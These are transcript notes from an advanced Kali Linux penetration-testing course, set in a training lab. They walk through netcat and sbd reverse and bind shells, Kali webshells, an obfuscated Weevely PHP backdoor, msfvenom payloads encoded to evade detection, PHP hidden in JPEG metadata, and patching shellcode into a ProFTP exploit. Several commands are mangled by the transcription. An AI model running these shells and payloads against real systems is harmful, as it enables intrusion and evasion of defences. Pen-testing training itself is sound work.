> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980&t=0)** - [Instructor] In my first [[Kali Linux]] course, I showed you how to set up a test network with Metasploitable as your main testing target and with some servers as discrete targets. We'll be using these targets in this pen testing series of courses. If you haven't got this network set up, check out the course here. For your advanced work, you'll want to have a wider selection of targets, and that becomes quite difficult to maintain for yourself. Offensive Security, the folks who provide Kali and run the [[OSCP]] certification, provide a number of proving grounds for building up your skills in [[Penetration Testing]]. There's a free-to-use PG Play, and also a more extensive paid PG Practice. Let's take a look at the PG Play. You'll need to register for this if you haven't already got an account. I'm in the Play Ground, and we can see there's a number of machines at varying levels of difficulty. When we want to use one, we can start it using the control at the right. There's also, at the top right, an option to use an in-browser Kali system or download an open VPN access script. Hack The Box is another online lab, which you can use for free. And it has a range of test targets rated from easy to difficult. Again, you need to register an account to access the lab. You can register through a free subscription and have access just to a limited number of active systems, or you can take a paid VIP subscription and have access to all of the active
>
> **[1:34](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980&t=94)** and the retired systems in the lab. Where possible, I'll use the free subscription targets in these labs, but some of the more complex targets will be in the main labs. Again, you need to register an account to access the lab. You can register through a free subscription and have access to just a limited number of active systems, or you can take a paid VIP subscription and have access to all of the active and the retired systems in the lab. Let's take a look at the [[LinkedIn]] Learning lab. At this stage, the dedicated labs have not been added to the new interface, so we'll log into the legacy site using the home URL. Instructions for registering on the lab are provided in your exercise file. Okay, I'm in the lab now. We'll select Dedicated Labs. US LinkedIn Learning. We can see the various machines that are available in the lab. You don't need to start and stop them, they're all available for you whenever you access the VPN. The operations at the right enable you to reset the system, submit a flag for user, and submit a flag for route. Your VPN access file can be downloaded by clicking Access. And clicking Download your connection pack here. We'll be using the dedicated LinkedIn Learning lab, so if you want to follow along hands-on, register, download your access pack, and connect to the VPN.
>
> **[3:09](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980&t=189)** I've got my pack in my labs folder. And I connect using sudo openvpn kiwi.ovpn. In another terminal, I can scan the network with [[Nmap]]. nmap
>
> **[3:28](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980&t=208)** - sn 10.10.10.0 /24 And we can see the systems are active. Once you get started in your career in pen testing, you'll likely want to stretch your training beyond what we cover in this course. These two online test labs are a good place to exercise and grow your skills as part of the continuous training you'll need throughout your career.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[LinkedIn]] (3), [[Nmap]] (2), [[Kali Linux]] (1), [[OSCP]] (1), [[Penetration Testing]] (1)
> **Env Vars:** vpn (4), vip (2), oscp (1), url (1)
> **Prerequisites:** set up (2), you'll need (2)
> **Speakers:** - [instructor] (1), - sn (1)
> **CLI Commands:** sudo (1)
> **Versions:** 10.10.10 (1)
> **Tools:** terminal (1)
> **Exercise Files:** exercise file (1)


### 2. System Shells

[↑ Back to Table of Contents](#table-of-contents)

#### [Introduction to shells](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=0)** - [Instructor] Command shells are important when pen testing, as they're the main form of access we can use to take control of a target system. We'll need a variety of shells on hand to include in our exploits. The simplest way to get a show is [[Netcat]]. If the target has netcat installed, then it's easier to establish a direct command line shell. Let's see how we connect between systems and serve per shell. Firstly, we'll set a port listener on Kali nc -lvnp 2222.
>
> **[0:35](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=35)** We'll then need to inject something into the target, in this case Metasploitable, which will execute netcat, to call back to the Kali system on the listening port and present a shell using the e switch. The implant would run the following command, nc 10.0.2.18 2222 -e/bin/bash.
>
> **[1:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=63)** And in Kali, when we request the host name, we find this metasploitable. Okay, we'll have a [[Linux]] shell on metasploitable. We're a bit limited here, but we can use [[Python (Programming Language)|Python]] to pop up a higher level shell, which provides a better experience for us. python -c "import pty:pty.spawn("/binbash").
>
> **[1:34](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=94)** Okay, we now have our targets command prompt. Now the shell is running as our original shell, so we'll have to exit twice to clear out of it. Exit, exit. Another tool provided in Kali is sbd, it's command line parameters are the same as for netcat when using the default encryption key, but we can run sbd with our own encryption key by using the -k parameter. Okay, let's set up our listener. sbd -lvnp 2222 -k BlueTrumpet.
>
> **[2:14](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=134)** Sbd doesn't come as standard with Linux deployments. If we wanted to use a secure shell connection, we'd have to make sure we can install sbd on our target. For the purpose of demonstrating sbd, I'll use another shell on Kali. sbd 127.0.0.1 2222 -e /bin/bash -k BlueTrumpet.
>
> **[2:42](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=162)** And we have a connection. And we can start issuing bash commands. WhoamI, hostname. Getting back to netcat, I can also create a shell connection to a [[Windows]] target. I'll set up my Windows host system as a listener using the Windows version of the netcat utility. nc -lvnp 2222 -e cmd.exe.
>
> **[3:21](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=201)** And I can now connect to my Windows system from Kali to get to command shell. nc 192.168.1.115 2222,
>
> **[3:33](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=213)** and we can render.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Netcat]] (6), [[Windows]] (4), [[Linux]] (2), [[Python (Programming Language)|Python]] (2)
> **Tools:** bash (3), command line (2), command prompt (1)
> **CLI Commands:** python (2), find (1), make (1)
> **Versions:** 10.0.2 (1), 127.0.0 (1), 192.168.1 (1)
> **Prerequisites:** set up (2), install (1)
> **Speakers:** - [instructor] (1)

#### [Exploring Kali webshells](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=0)** - [Tutor] One of the more important categories of shells are those that can be activated via the web. If we have the opportunity to upload a file to a website, we can then use this to activate the shell remotely via the URL. If the service supports the active code, it will pop a shell in place. If it doesn't support the active code, then it will just display a panel asking whether to open or save the file. Because different targets will have different [[Forms]] of active code, you need to have as many web shells available as possible. Kali provides a number of web shells to support the various active code options. Let's take a look at them. LS /user/share/webshells. Here we can see folders for ASP, ASPX, CFM, JSP, Perl, and [[PHP]]. The different variants of the same basic shell approach. We also have the Laudanum repository of web shells to be used in conjunction with [[SQL]] injections. A popular form of active content is PHP. We've got a few files here. Let's take a look at the reverse shell, which is a great way to gain shell access on a target. Nano /user/share/webshells/php/php-reverse-shell.php.
>
> **[1:35](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=95)** Let's scroll down past the comments. We can see the dollar IP and dollar port variables being set. We need to change these to the callback socket that we'll set-up, our Kali address. For example, I can set-up 10.0.2.18 for Kali and 2222.
>
> **[2:01](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=121)** Let's save that as shelly.php.
>
> **[2:12](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=132)** We need to be able to upload the PHP file into a folder, which is directly accessible from the URL. For [[Linux]], this is typically in var/www or one of his descendant folders such as var/www/[[HTML]]. For [[Windows]], this is typically in inet/pub/wwwroot. Some systems will have their own special purpose directories. ColdFusion for example has a CFIDE folder in which content is placed. The Metasploitable server runs PHP. And I've uploaded the file shelly.php into the folder, myacc. Let's firstly create a listener, NC -lvmp 2222.
>
> **[2:59](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=179)** And then let's navigate to the target URL, 10.0.28/myacc/shelly.php.
>
> **[3:15](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=195)** We have a shell, whoamI. And we can see it's a user shell running as Apache's www-data account. If the target doesn't allow connections out to random ports, we may want to set our listener up on port 80 or 443. These are generally allowed. Two other forms of shell we might find useful are ASP and ASPX. ASP is an older technology, but is a default part of older [[Microsoft]] IIS websites. LS /user/share/webshells/asp.
>
> **[3:57](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=237)** Commandasp will allow a single command to be run. Commandasp 5.1 is a variant of commandasp, which gets around an execution prevention mechanism in IIS 5.1. This uses the [win.com](https://win.com) executable to force execution of the command processor. We've got a similar file in ASPX. These web shells run on the browser and don't give us a reverse command shell to work in, but we can issue individual commands. Commandasp.aspx is a popular web shell. And is also known as Awen or Aspen. Let's see how we use the ASPX web shell. I've loaded this as aspen.aspx onto a target on 10.10.10.5. If we now navigate to 10.10.10.5/aspen.aspx,
>
> **[4:57](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=297)** we get a command prompt. And I can enter, whoamI. And we can see we're running as IIS apppool/web. There are more web shells that come standard with Kali. Let's check the JSP web shells. We can see command JSP, and let's see what that looks like. Nano /user/share/webshells/jsp/cmdjsp.jsp.
>
> **[5:41](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=341)** This shell can work either on a Linux server or a Window server. As it notes at the top, the executable needs to be changed to reflect the target before deployment. It's set here for a Window server using CMD to process Windows commands. Let's take a look at Perl. And again, we have the Perl reverse shell and Perl command. Let's take a look at the Perl reverse shell script, perl-reverse-shell.pl.
>
> **[6:24](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=384)** And this looks very familiar. It's a variant of the PHP web shell. Each target will have its own variation of active code and potential target folders. Having a set of web shell files to deal with each environment is important.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[PHP]] (11), [[Forms]] (2), [[Linux]] (2), [[Windows]] (2), [[SQL]] (1)
> **Env Vars:** php (5), aspx (4), url (3), asp (3), jsp (3)
> **CLI Commands:** php (11), ls (2), apache (1), find (1)
> **Versions:** 5.1 (2), 10.10.10 (2), 10.0.2 (1), 10.0.28 (1)
> **Definitions:** is a  (4), is an  (1), known as (1)
> **File Paths:** shelly.php (2), user/share/webshells/php/php-reverse-shell.php (1), 10.0.28/myacc/shelly.php (1)
> **UI Navigation:** navigate to (2), scroll down (1)
> **Analogies:** for example (2), such as (1)

#### [Weeving a shell](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/weeving-a-shell?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/weeving-a-shell?u=76281980&t=0)** - Weevely is a command-line tool deployed in Kali, which can be used to generate a [[PHP]] shell implant. And then after it's been deployed onto a target, connect to it. The command and control components of the system in its basic form connects using a URL call to its PHP implants. And through that serves up a command line shell. Let's take a look at it. Weevely can be used in three ways. First to connect to a deployed implant. Second, to connect to a session, and then last to generate an implant. Let's start by generating an implant. The implant we generate will be a small polymorphic PHP agent, which is difficult for antivirus to detect. And the communications channel is deliberately obfuscated to confuse monitoring systems. I'll generate a Weevely module called wish.php with a password of bedbug. Weevely generate bedbug wish.php. By uploading wish.php to a target we can then use Weevely to connect to it, and this will give us a shell. We can include a password on the command line, and this makes sure we can block anyone else from using it. Let's take a look at wish.php. Nano wish.php. We can see this as a PHP script, but it's got some bizarre commands. They've been mangled and de-mangling replace statements included.
>
> **[1:33](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/weeving-a-shell?u=76281980&t=93)** This makes it difficult for monitoring software to detect the PHP commands as being a backdoor. I won't decode this, we can let Weevely do that for us. This implant code needs to be deployed onto an accessible folder and call directly, or it can be inserted into part of an existing PHP script on the target. The implant code is very discreet, running it won't show anything on the webpage or server console. Okay, I've deployed wish.php onto my metasploitable system in the myacc folder, so I can now connect to it. Weevely HTTP 10.0.2.8 my acc wish.php
>
> **[2:19](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/weeving-a-shell?u=76281980&t=139)** with our password of bedbug. And here we have a Weevely shell. Note that we have a session file created for us. If we leave this session, we can come back to it using the session file, using the keyword session when we make the Weevely call. Weevely may on some targets, display a 500 error, but this doesn't affect the command, so we can ignore it. Let's find out who we are. Who am I? And we're www-data. As well as providing shell access, we can run some pre-baked commands. Let's take a look at what we can do using help, :help. There's 30 or so commands to use, each of which package out one or more shell commands we might want to issue. We can get Weevely to dump the et cetera password file, :audit_etc password. Of course, we can do that by issuing the cat command. We can audit the file system to find potential attack vectors, :audit file system. And we can get the basic system information, :system info. We can upload and download files also. I'll upload a test file. :File_upload test.txt to a writeable folder temp/test.txt. We can create a new reverse TCP shell to a third system.
>
> **[3:56](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/weeving-a-shell?u=76281980&t=236)** I'll start a listener on 4141 and we'll connect to it. Backdoor reverse TCP 10.0.2.18, and 4141. Again, we get some errors, but we can see that we've connected to the listener. Who am I? Www-data. And we can terminate the Weevely connection. And we're still running. Now, note before we leave Weevely. When you install Weevely on your target, make sure you set its execution bit as this helps avoid unreliability when spawning additional shells.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[PHP]] (13)
> **CLI Commands:** php (13), make (2), find (2), cat (1)
> **Env Vars:** php (6), tcp (2), url (1), http (1)
> **File Paths:** wish.php (7), test.txt (1), temp/test.txt (1)
> **Versions:** 10.0.2 (2)
> **Tools:** command line (2)
> **Code Identifiers:** audit_etc (1)
> **Definitions:** is a  (1)

#### [Generating shellcode with msfvenom](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=0)** - [Instructor] [[Metasploit|MSFvenom]] is an important tool which comes with Kali. It can be configured to generate shell code for a wide variety of scenarios, both binary and web based. Let's see how we create an executable that we can drop onto a [[Windows]] target to make a reverse callback to a waiting [[Netcat]] listener. We'll call it wince.exe. msfvenom -p, the payload is windows/shell_reverse_tcp LHOST=10.0.2.1.18 for our Kali listener and our LPORT, we'll set to 2222. We'll make it an exe format and put the output into wince.exe. Okay, we now need to find a way to get this uploaded into Windows and then to execute it. Let's set up our listener on Kali. nc -lvnp 2222. On Windows, all we need is for the implant to be run. Wince, and here we have a Windows shell. An useful option when creating a web shell is the encoder, which can be used to manipulate the generated code to avoid being blocked by [[Intrusion Detection]] systems when we upload it. Two popular encoding schemes are Base64
>
> **[1:34](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=94)** and the more effective Shikata Ga Nai encoding. Encoding the payload becomes important, especially when testing live networks in a red team scenario where malicious payloads will be detected and blocked. Let's create a Meterpreter shell executable. We'll call winmet.exe. This runs exactly like the Windows shell, except that we use [[Metasploit|MSFconsole]] to have a Meterpreter listener set up for the callback. MSFvenom, and the payload is windows /meterpreter/reverse_tcp, LHOST again is 10.0.2.18, and the LPORT again is 2222, and we'll encrypt with x86/ shikata_ga_nai into an executable and we'll call it when winmet.exe. Okay, we've now got our encoded Meterpreter shell implant. Okay, let's set a listener up. MSFconsole, we'll use exploit/multi/handler we'll set our payload to windows/meterpreter/ reverse_tcp.
>
> **[3:12](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=192)** We'll set our LHOST to 10.0.2.18, and we'll set our LPORT 2222. And we'll run that. Again, using some form of infiltration, I've managed to upload Winmet to my Windows machine. All I have to do now is run the implant winmet. And here we have the Meterpreter shell. Sysinfo, and we can see it's a [[Windows 10]] system. We can create an endpoint for [[Linux]] in a similar way, msfvenom -p linux/ x86/meterpreter /reverse_tcp LHOST=10.0.2.8, LPOST=2222. We'll again encrypt it using x86/ shikata_ga_nai. In this case, the format will be elf and we'll write it out to linmet. We can use MSFvenom to create custom payloads, including backdoors and reverse shells for [[PHP]], ASP, JSP, Perl, and [[Python (Programming Language)|Python]]. Let's create a Python reverse shell.
>
> **[4:45](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=285)** We can use the cmd/unix/reverse_python to do this. MSFvenom and the payload is cmd/unix /reverse_python, and we put in our host and port. And in this case, the format will be raw. And we write this out to cmdpy.sh. Let's have a look at the implant, nano cmdpy.sh. And we can see it's a Python execution command with a command line script, which incorporates a Base64 payload. Let's set up our listener again, using Netcat, nc -lvmp 2222. Okay. I've taken the implant across to Metasploitable. I need to set the command file to be executable and then run the command, chmod +x cmdpy.sh, and then ./cmdpy.sh. And back in Kali, we have a connection. And when I look at the hostname, it's Metasploitable. Okay. We have a bash shell. We can also create a Python reversed Meterpreter shell directly. We do this with msfvenom -p python/meterpreter
>
> **[6:22](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=382)** /reverse_tcp LHOST=10.0.2.18, LPOST=2222. And we'll make it raw. And we'll put it out to cmd.py. And if we have a look at this cmd.py, we can see that it's a Python script running the exec function. Let's set up our listener in MSFconsole, msfconsole use exploit/multi/handler, set payload python/ meterpreter/reverse_tcp as we did on MSFvenom, set lhost 10.0.2.18, set lport 2222 and run. And assuming we've been able to implant it, we can now run this from Metasploitable. Python cmd.py. And again, we see we have a Meterpreter shell. Sysinfo, Metasploitable. Okay.
>
> **[7:56](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=476)** We can create ASP payloads in a similar way. msfvenom -p and we'll create a windows /shell_reverse_tcp with LHOST=10.0.2.18, LPOST=2222, and we can encrypt with x86 /shikata_ga_nai, we'll make the format ASP and we'll write it out to cmd.asp. And we can create [[JavaScript]] payloads also. msfvenom -p [[Java]] /jsp_shell_reverse_tcp HOST=10.0.2.18 LPOST=2222, and we'll put it out in raw format to cmd.jsp.
>
> **[9:17](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=557)** We can now upload these implants to [[Web Servers]] running the respective active code and put them into its web tree. And we can gain a command or Meterpreter shell by accessing them via the URL.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Metasploit|Msfvenom]] (10), [[Windows]] (10), [[Python (Programming Language)|Python]] (8), [[Metasploit|Msfconsole]] (4), [[Netcat]] (2)
> **Env Vars:** lhost (6), lpost (4), lport (3), asp (3), php (1)
> **CLI Commands:** python (8), make (4), find (1), php (1), chmod (1)
> **Code Identifiers:** reverse_tcp (5), shikata_ga_nai (3), shell_reverse_tcp (2), reverse_python (2), jsp_shell_reverse_tcp (1)
> **Versions:** 10.0.2 (8), 1.18 (1)
> **File Paths:** cmdpy.sh (4), cmd.py (3)
> **Prerequisites:** set up (4)
> **Tools:** command line (1), bash (1)

#### [Injecting images with jhead](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/injecting-images-with-jhead?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/injecting-images-with-jhead?u=76281980&t=0)** - [Narrator] Website owners are generally aware that script uploads are dangerous, but more often than not have no problems with uploading images. Websites may validate that the upload actually is an image and proper validation will check the file contents rather than just the extension. So we can't just upload a script file and give it to JPEG name. Images however are not always safe. Jhead is a simple but very useful tool for injecting [[PHP]] into an image as [[Metadata]], in such a way that it allows us to execute commands via the image, because it uses a real image as the carrier, we can still upload it to a website that checks for a valid image file. Let's install Jhead sudo apt install Jhead.
>
> **[0:55](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/injecting-images-with-jhead?u=76281980&t=55)** I've got a file called NSA.JPEG in my home folder. Let's use Jhead to make this into a file which can run commands. The first thing we'll do is to sanitize the image and clear its metadata, and then the existing exploit which might be there, Jhead minus purejpg nsa.jpg.
>
> **[1:19](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/injecting-images-with-jhead?u=76281980&t=79)** Okay. And we can now add our exploit code Jhead minus ce nsa.jpg. Okay. We're in the editor and I'll press I to go into insert mode and I'll enter the script. I'll enter escape to quit insert mode and the : X to exit and Jhead notifies us that we've modified nsa.jpg. The final thing we have to do is rename the file to include the PHP extension so that when we use it, we get the PHP code executing. So we'll move nsa.jpg to nsa.php.jpg
>
> **[2:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/injecting-images-with-jhead?u=76281980&t=128)** Okay, we have our malicious image ready to go. We can now upload this to a website. For this demonstration I've copied this over to my matrix floatable server. And so we'll navigate to 10.0.2.8, and take a look at nsa.php.jpg, and we'll give it the parameter command equals and we'll try ls. Okay, we've got so listing our exploits working. Let's now try for shell. For the command we'll now put nc minus lvpn 2222,
>
> **[2:55](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/injecting-images-with-jhead?u=76281980&t=175)** and we'll ask it to execute bin bash. And when we nc into our server 10.0.2.8 on 2222,
>
> **[3:12](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/injecting-images-with-jhead?u=76281980&t=192)** we have a shell.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[PHP]] (5), [[Metadata]] (2)
> **CLI Commands:** php (5), sudo (1), apt (1), make (1), ls (1)
> **Env Vars:** php (3), jpeg (2), nsa (1)
> **File Paths:** nsa.php (2)
> **Versions:** 10.0.2 (2)
> **Definitions:** is an  (1), is a  (1)
> **Prerequisites:** install (2)
> **Tools:** bash (1)

#### [Using shellcode in exploits](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-shellcode-in-exploits?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-shellcode-in-exploits?u=76281980&t=0)** - [Instructor] An exploit may take its own shell along with it, built as a payload. If we download an exploit with an embedded shell, we'll usually need to replace the shell code with our own, to reflect the correct reverse IP address and port. An example of this is the pro FTP [[Python (Programming Language)|Python]] code that we can see here on [[GitHub]]. We can see by looking at the code, that the exploit expects to be updated with an effective shell. And it even provides the [[Metasploit|MSFvenom]] call to generate it. Note the MSFvenom LHOST and LPORT parameters, will need to be modified to our IP address and port. For ProFTP, the target is usually [[Linux]], so we need to generate a Linux shell with Bash. This exploit has limitations on size, so we need to create the smallest shell we can by including the minus, minus smallest switch. MSFvenom minus P, Linux slash x86,
>
> **[1:01](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-shellcode-in-exploits?u=76281980&t=61)** slash shell reverse, TCP. And our LHOST is 10.0.2.18, and our LPORT will be two, two, two, two. The command will be slash bin, slash bash, prepend to route, break equals true, minus, minus small list, minus F Python, minus V payload, minus B, slash X09, slash X0A, slash X0B, slash X0C, slash X0D, slash X20, slash XFF. Okay. The exploit uses a plain text entry as its vulnerability, and we have to be careful not to break the syntax rules, by including nulls, spaces, or line breaks. MSFvenom provides the minus B switch, to enable us to specify characters, which are not allowed in the output. Secondly, we prepend true route, break code, to ensure that we avoid being locked into a limited area of the system, slash FTP root for example, so that we can access the full file base.
>
> **[2:37](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-shellcode-in-exploits?u=76281980&t=157)** Okay, we have a payload code block ready to cut and paste to replace the code in the exploits. Let's use nano to edit the original exploit code.
>
> **[2:52](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-shellcode-in-exploits?u=76281980&t=172)** We'll copy this, and we'll nano, ProFTP, telnet, iac.py. And we'll come down to here, get rid of the code, and insert our code. Okay, we've now prepared a ProFTP Python exploit, which will connect to a listener on my Kali system, using port two, two, two, two. We'll come back to this in the next section, when we look at exploits.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Metasploit|Msfvenom]] (4), [[Python (Programming Language)|Python]] (3), [[Linux]] (3), [[GitHub]] (1)
> **Env Vars:** ftp (2), lhost (2), lport (2), tcp (1), x09 (1)
> **CLI Commands:** python (3)
> **Tools:** bash (2), github (1)
> **File Paths:** iac.py (1)
> **Versions:** 10.0.2 (1)
> **Cross-References:** in the next (1)
> **Analogies:** for example (1)


### 3. Exploiting Targets from Kali

[↑ Back to Table of Contents](#table-of-contents)

#### [Exploiting systems with Kali](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-systems-with-kali?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-systems-with-kali?u=76281980&t=0)** - [Instructor] Let's look at how we use Kali for gaining full control of targets. The first thing we need to do is to select an exploit. And if we're lucky, we'll find one already prepared inside [[Metasploit]]. However, sometimes we need to pick up a raw exploit and make it usable from Kali. There are many sources we could use for this, but the most likely source will be [[Exploit-DB|exploitDB]]. Exploits can come in any number of languages. For Metasploit modules, the exploits are written in Ruby and use the Metasploit Framework. C, C++, [[Python (Programming Language)|Python]], and Perl are commonly seen in exploitDB. And sometimes we get Ruby exploits which are not yet in Metasploit. Let's see how we handle a sample of such exploits.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Metasploit]] (4), [[Exploit-DB|Exploitdb]] (2), [[Python (Programming Language)|Python]] (1)
> **CLI Commands:** ruby (2), find (1), make (1), python (1)
> **Code Identifiers:** exploitdb (2)
> **Speakers:** - [instructor] (1)

#### [Exploiting with Python](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-python?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-python?u=76281980&t=0)** - [Instructor] Let's look at how we use [[Python (Programming Language)|Python]] exploits. In 2014, the Shellshock exploit was detected. Shellshock is an HTTP exploit, which is able to force execution of Bash commands, and so achieve remote code execution. It was given the code CVE-2014-6271, It was given the code CVE-2014-6271, and known more formerly, as the "Bash Environment Variable Code Injection." Let's find this exploit in Exploit DB. Searchsploit shellshock. Searchsploit shellshock. The second line down is our Shellshock attack. We'll copy this into our home directory. Copy /usr/share/[[Exploit-DB|exploitdb]]/exploits/ Copy /usr/share/exploitdb/exploits/ and it's in [[Linux]] remote, and it's called 34900.py. and it's in Linux remote, and it's called 34900.py. We'll copy that into shellshock.py. We'll copy that into shellshock.py. Let's take a look at it. Nano shellshock.py. Nano shellshock.py. Nano shellshock.py. The first thing we can see is a comment block on how to use the script. We need to add the remote host IP address and define the payload as a reverse shell or as a bind, which just delivers a shell on the execution terminal. Now that the exploit, if not using a proxy, assumes port 80.
>
> **[1:34](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-python?u=76281980&t=94)** The rport parameter is the bind shell port that's created, not an alternative website port. We then see the exploit function, which will try to make a connection on each CGI page. Further down, we can see the magic Shellshock string. The open and close brackets, curly brackets, and colon, semi-colon. Together with the Bash call for a Bash shell, or a [[Netcat]] connection back serving up a Bash shell for bind and reverse payloads respectively. The script will either try the set of pages provided in the call, or use a small default set of CGI pages that we can see here. Finally, we have the script code to call the functions. This is a useful script that we can use as is, to add to our inventory of exploit tools. Although nowadays, we'll find most systems patch against this attack.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Exploit-DB|Exploitdb]] (2), [[Linux]] (2), [[Python (Programming Language)|Python]] (1), [[Netcat]] (1)
> **File Paths:** shellshock.py (5), 34900.py (2)
> **Tools:** bash (5), terminal (1)
> **Env Vars:** cve (2), cgi (2), http (1)
> **CLI Commands:** find (2), python (1), make (1)
> **Definitions:** is a  (2), is an  (1)
> **Ports:** port 80 (1)
> **Speakers:** - [instructor] (1)

#### [Exploiting with Perl](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-perl?u=76281980)

> [!transcript]- Transcript
>
